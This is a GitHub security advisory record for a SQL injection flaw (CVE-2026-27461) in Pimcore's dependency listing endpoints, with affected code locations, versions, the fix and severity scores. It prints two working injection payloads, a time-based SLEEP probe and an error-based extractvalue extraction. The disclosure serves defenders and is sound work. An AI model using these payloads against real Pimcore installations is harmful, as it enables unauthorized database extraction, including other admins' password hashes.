advisory_id: GHSA-vxg3-v4p6-f3fp
datasource_id: github_osv_importer_v2/GHSA-vxg3-v4p6-f3fp
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vxg3-v4p6-f3fp/GHSA-vxg3-v4p6-f3fp.json
aliases:
  - CVE-2026-27461
summary: |
  Pimcore vulnerable to SQL injection via unsanitized filter value in Dependency Dao RLIKE clause
  The filter query parameter in the dependency listing endpoints is JSON-decoded and the value field is concatenated directly into RLIKE clauses without sanitization or parameterized queries.

  Affected code in models/Dependency/Dao.php:
  - getFilterRequiresByPath() lines 90, 95, 100
  - getFilterRequiredByPath() lines 148, 153, 158

  All 6 locations use direct string concatenation like:

      "AND LOWER(CONCAT(o.path, o.key)) RLIKE '".$value."'"

  Note that $orderBy and $orderDirection in the same methods (lines 75-81) ARE properly whitelist-validated, but $value has zero sanitization.

  Entry points (pimcore/admin-ui-classic-bundle ElementController.php):
  - GET /admin/element/get-requires-dependencies (line 654)
  - GET /admin/element/get-required-by-dependencies (line 714)

  The controller JSON-decodes the filter query param and passes $filter['value'] straight to the Dao without any escaping.

  PoC (time-based blind):

      GET /admin/element/get-requires-dependencies?id=1&elementType=document&filter=[{"type":"string","value":"x' OR SLEEP(5)#"}]

  If vulnerable, the response is delayed by ~15 seconds (SLEEP runs 3 times, once per UNION arm in the inner subquery).

  PoC (error-based extraction):

      GET /admin/element/get-requires-dependencies?id=1&elementType=document&filter=[{"type":"string","value":"x' OR extractvalue(1,concat(0x7e,(SELECT version())))#"}]

  Returns the MySQL version string in the error response.

  Requires admin authentication. An attacker with admin panel access can extract the full database including password hashes of other admin users.
impacted_packages:
  - purl: pkg:composer/pimcore/pimcore
    affected_versions: vers:composer/<=11.5.14+1
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:composer/pimcore/pimcore
    affected_versions: vers:composer/>=12.0.0|<12.3.3
    fixed_versions: vers:composer/12.3.3
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-vxg3-v4p6-f3fp/GHSA-vxg3-v4p6-f3fp.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-89
references:
  - url: https://github.com/pimcore/pimcore
    reference_type:
    reference_id:
  - url: https://github.com/pimcore/pimcore/commit/1c3925fbec4895abeb21e5c244a83679c4e4a6f4
    reference_type:
    reference_id:
  - url: https://github.com/pimcore/pimcore/pull/18991
    reference_type:
    reference_id:
  - url: https://github.com/pimcore/pimcore/releases/tag/v12.3.3
    reference_type:
    reference_id:
  - url: https://github.com/pimcore/pimcore/security/advisories/GHSA-vxg3-v4p6-f3fp
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-27461
    reference_type:
    reference_id: CVE-2026-27461
